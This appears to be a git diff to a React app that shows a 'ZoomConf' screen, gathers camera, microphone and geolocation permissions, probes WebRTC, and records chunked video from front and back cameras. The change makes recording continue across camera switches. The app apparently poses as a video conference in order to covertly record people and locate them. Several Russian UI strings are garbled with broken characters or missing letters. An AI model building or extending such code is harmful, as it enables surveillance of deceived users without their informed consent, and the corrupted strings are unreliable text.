@@ -32,6 +32,7 @@ export default function App() {
   const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
   const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('front');
   const isSwitchingCameraRef = useRef(false);
+  const globalChunkCounterRef = useRef(0); // Global chunk counter across camera switches
   
   // Check if running in iframe with restricted permissions
   const checkIframePermissions = (): string | null => {
@@ -164,7 +165,7 @@ export default function App() {
             }, 1000);
           })
           .catch(err => {
-            log('⚠️ [macOS] WebRTC ош��бка (не критичн):', err);
+            log('⚠️ [macOS] WebRTC ошбка (не критичн):', err);
             pc.close();
             resolve();
           });
@@ -316,7 +317,7 @@ export default function App() {
         isMac ? 'Mac определяет местоположение через Wi-Fi сети.' : 'в настройках ОС.'
       ].filter(Boolean).join('\n');
       case 2: return isMac 
-        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > С��ужбы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
+        ? '❌ Не удалось определить местоположение.\n\n🖥️ macOS:\n1️⃣ Подключитесь к Wi-Fi (обязательно!)\n2️⃣ Настройки > Защита и безопасность > Сужбы геолокации\n3️⃣ Включите службы геолокации\n4️⃣ Разрешите брузеру доступ\n\n⚠️ Mac не имеет GPS, используетс Wi-Fi трангуляция!'
         : '❌ Не удалось определить местоположение.\nВключите GPS и/или интернет.';
       case 3: return '❌ Истёк таймаут.\nПерейдите в место с лучшим приёмом GPS/сети\nи повторите.';
       default: return isMac
@@ -367,7 +368,7 @@ export default function App() {
       cameraSuccess = true;
       
       // Update UI after success
-      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолокацию...');
+      setCoordsData('✅ Камера и микрофон: разрешено\n\n🔄 Запрашиваем геолок��цию...');
       setShowCoords(true);
     } catch (e: any) {
       hasErrors = true;
@@ -445,7 +446,7 @@ export default function App() {
         
         // Show specific GPS enable instructions
         if (e?.code === 2) {
-          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повторить попытк"');
+          results.push('\n⚡ ДЕЙСТВИЕ ТРЕБУЕТСЯ:\nВключите GPS в настройках устройства,\nзатем нажмите кнопку "Повто��ить попытк"');
         }
       }
     }
@@ -863,13 +864,15 @@ export default function App() {
     <>
       <ZoomConf onRequestPermissions={handleRequestAllPermissions} />
       
-      {/* Video Recording Component */}
+      {/* Video Recording Component - key forces remount on camera switch */}
       {videoStreamFront && (
         <VideoRecorder
+          key={currentCameraType}
           stream={videoStreamFront}
           isRecording={isVideoRecording}
           onChunkReady={handleVideoChunkReady}
           cameraType={currentCameraType}
+          globalChunkCounter={globalChunkCounterRef}
         />
       )}
     </>
